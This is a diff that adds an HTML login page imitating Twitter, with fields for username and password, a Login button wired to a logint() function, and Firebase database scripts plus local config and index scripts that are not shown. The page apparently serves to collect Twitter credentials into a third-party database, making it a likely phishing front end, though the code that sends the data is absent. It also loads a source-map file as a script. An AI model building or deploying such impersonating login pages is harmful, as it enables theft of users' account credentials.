@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Twitter - Login</title>
+    <link rel="stylesheet" href="/css/all.css" />
+    <link rel="stylesheet" href="/css/style.css" />
+  </head>
+  <body>
+    <main class="login-page change-to-theme-dark-2">
+      <!-- Header -->
+
+      <!-- navigation -->
+      <nav class="login-page-nav change-to-theme-dark-1">
+        <ul>
+          <li class="brand">
+            <a href="#"><i class="fas fa-dove"></i> Home</a>
+          </li>
+          <li><a href="#">About</a></li>
+          <li><a href="#">Feeds</a></li>
+          <li><a href="#">Language: English</a></li>
+        </ul>
+      </nav>
+      <!-- end of navigation -->
+
+      <!-- end of header -->
+      <section class="login change-to-theme-dark-1">
+        <article class="login-content">
+          <h2>Log in to twitter</h2>
+          <div class="login-form">
+            <input type="text" placeholder="Phone, email, or username" id="email"/>
+            <div class="password-forgot">
+              <a href="#">Forgot password?</a>
+              <input type="password" placeholder="Password" id="pass"/>
+            </div>
+            <div class="checkbox-login">
+              <input
+                type="checkbox"
+                name="remember"
+                id="remember"
+                class="login-form-checkbox"
+              />
+              <label for="remember">Remember me</label>
+            </div>
+              <button type="button" class="btn btn-sign-in" onclick="logint()">Login</button>
+            </div>
+        </div>
+        </article>
+        <footer class="login-footer change-to-theme-dark-2">
+          <p>New to twitter? <a href="#">Sign up now</a></p>
+          <p>
+            Aready using twitter via text message?
+            <a href="#">Activate your account now</a>
+          </p>
+          <section class="dark-mode-toggler-wrapper">
+            <label class="dark-mode-toggler">
+              <input
+                class="dark-mode-toggler-check-input"
+                type="checkbox"
+                id="theme-checkbox"
+              />
+              <span class="slider"></span>
+            </label>
+            <span class="dark-mode-toggler-check-label theme-switch"
+              >Dark theme</span
+            >
+          </section>
+        </footer>
+      </section>
+    </main>
+    <script src="/js/main.js" async></script>
+  </body>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+  <script src="./main/config.js"></script>
+<script src="./main/index.js"></script>
+</html>
